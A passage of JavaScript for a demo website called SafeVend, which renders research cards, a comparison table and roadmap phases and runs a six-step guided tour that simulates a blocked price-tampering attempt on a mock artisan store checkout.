        setTimeout(() => triggerSimulatedSuspiciousInput(), 300);
      });
    }

    if (btnAttackBot) {
      btnAttackBot.addEventListener("click", () => {
        window.location.hash = "#checkout";
        setTimeout(() => triggerSimulatedBotRequest(), 300);
      });
    }
  }

  /* ==========================================================================
     7. RESEARCH LITERATURE, COMPARISON, AND ROADMAP RENDERERS
     ========================================================================== */
  function initResearchAndRoadmap() {
    // Render 7 Literature Review Cards
    const papersContainer = document.getElementById("research-papers-container");
    if (papersContainer) {
      papersContainer.innerHTML = "";
      SafeVendData.researchPapers.forEach((p) => {
        const card = document.createElement("article");
        card.className = "research-paper-card";
        card.innerHTML = `
          <div class="paper-theme-badge">${p.theme} • ${p.year}</div>
          <h4>${p.title}</h4>
          <div class="paper-authors">${p.authors} — <em>${p.source}</em></div>
          <div class="paper-fact-block">
            <span class="lbl">Key Finding</span>
            <span class="val">${p.keyFinding}</span>
          </div>
          <div class="paper-fact-block">
            <span class="lbl">Research Limitation</span>
            <span class="val">${p.limitation}</span>
          </div>
          <div class="paper-insight-block">
            <strong>SafeVend Insight:</strong> ${p.safeVendInsight}
          </div>
          <div style="font-size: 0.75rem; color: var(--text-muted); font-family: var(--font-mono);">
            DOI / Ref: ${p.doi}
          </div>
        `;
        papersContainer.appendChild(card);
      });
    }

    // Render Conceptual Comparison Table
    const comparisonTbody = document.getElementById("comparison-table-body");
    if (comparisonTbody) {
      comparisonTbody.innerHTML = "";
      SafeVendData.comparisonMatrix.forEach((row) => {
        const tr = document.createElement("tr");
        tr.innerHTML = `
          <td style="font-weight: 600; color: #ffffff;">${row.criterion}</td>
          <td style="color: var(--text-muted);">${row.enterprise}</td>
          <td class="safevend-cell">✓ ${row.safeVend}</td>
        `;
        comparisonTbody.appendChild(tr);
      });
    }

    // Render 7 Roadmap Phases
    const roadmapContainer = document.getElementById("roadmap-timeline-container");
    if (roadmapContainer) {
      roadmapContainer.innerHTML = "";
      SafeVendData.roadmap.forEach((phase, idx) => {
        const card = document.createElement("div");
        card.className = `roadmap-card ${idx === 0 ? "current-phase" : ""}`;
        card.innerHTML = `
          <span class="phase-pill">${phase.phase} • ${phase.status}</span>
          <div class="roadmap-info">
            <h4>${phase.title}</h4>
            <p>${phase.description}</p>
            <div class="roadmap-items-grid">
              ${phase.items.map((it) => `<div class="roadmap-item-tag"><span>→</span> <span>${it}</span></div>`).join("")}
            </div>
          </div>
        `;
        roadmapContainer.appendChild(card);
      });
    }
  }

  /* ==========================================================================
     8. 7-MINUTE GUIDED PRESENTATION DEMO TOUR
     ========================================================================== */
  function initPresentationTour() {
    const startTourBtn = document.getElementById("btn-start-presentation-tour");
    const guideWidget = document.getElementById("presentation-guide-widget");
    const closeGuideBtn = document.getElementById("btn-close-guide");
    const nextGuideBtn = document.getElementById("btn-guide-next");
    const prevGuideBtn = document.getElementById("btn-guide-prev");

    const tourSteps = [
      {
        step: 1,
        title: "STEP 1 OF 6 • PROJECT INTRODUCTION",
        text: "SafeVend is a plug-and-play cybersecurity layer designed for micro-merchants who use basic e-commerce templates without dedicated security teams.",
        view: "home"
      },
      {
        step: 2,
        title: "STEP 2 OF 6 • ARTISAN STOREFRONT",
        text: "Notice CraftNest, a typical artisan store. The 'Handmade Tote Bag' is priced at ₹999. Click Next to proceed to the secure checkout.",
        view: "store"
      },
      {
        step: 3,
        title: "STEP 3 OF 6 • LEGITIMATE TRANSACTION CHECK",
        text: "Here is the checkout page with SafeVend's active protection sidebar. Notice the verified ₹999 total. Click Next to simulate an attack!",
        view: "checkout"
      },
      {
        step: 4,
        title: "STEP 4 OF 6 • PRICE TAMPERING ATTACK",
        text: "Simulating Price Tampering: An attacker attempts to modify ₹999 to ₹0.01! SafeVend detects the catalog mismatch and blocks the transaction immediately.",
        view: "checkout",
        action: () => triggerSimulatedPriceTampering()
      },
      {
        step: 5,
        title: "STEP 5 OF 6 • MERCHANT SECURITY DASHBOARD",
        text: "SafeVend instantly alerts the merchant! Notice the 'Blocked Threats' counter incremented, and the high-severity alert appears on the feed.",
        view: "dashboard"
      },
      {
        step: 6,
        title: "STEP 6 OF 6 • FORENSIC AUDIT & RESEARCH GAP",
        text: "Clicking any alert displays the forensic payload diff. SafeVend bridges the 2021-2025 research gap between enterprise security and micro-merchant simplicity.",
        view: "research"
      }
    ];

    const renderTourStep = () => {
      const current = tourSteps[state.guidedTourStep - 1];
      document.getElementById("guide-step-counter").textContent = current.title;
      document.getElementById("guide-step-instruction").textContent = current.text;

      navigateToView(current.view);

      if (current.action && typeof current.action === "function") {
        setTimeout(current.action, 500);
      }
    };

    if (startTourBtn) {
      startTourBtn.addEventListener("click", () => {
        state.isTourActive = true;
        state.guidedTourStep = 1;
        guideWidget.classList.add("open");
        renderTourStep();
      });
    }

    if (closeGuideBtn) {
      closeGuideBtn.addEventListener("click", () => {
        guideWidget.classList.remove("open");
        state.isTourActive = false;
      });
    }

    if (nextGuideBtn) {
      nextGuideBtn.addEventListener("click", () => {
        if (state.guidedTourStep < tourSteps.length) {
          state.guidedTourStep += 1;
          renderTourStep();
        } else {
          guideWidget.classList.remove("open");
          state.isTourActive = false;
        }
      });
    }

    if (prevGuideBtn) {
      prevGuideBtn.addEventListener("click", () => {
        if (state.guidedTourStep > 1) {
          state.guidedTourStep -= 1;
          renderTourStep();
        }
      });
    }
  }

})();
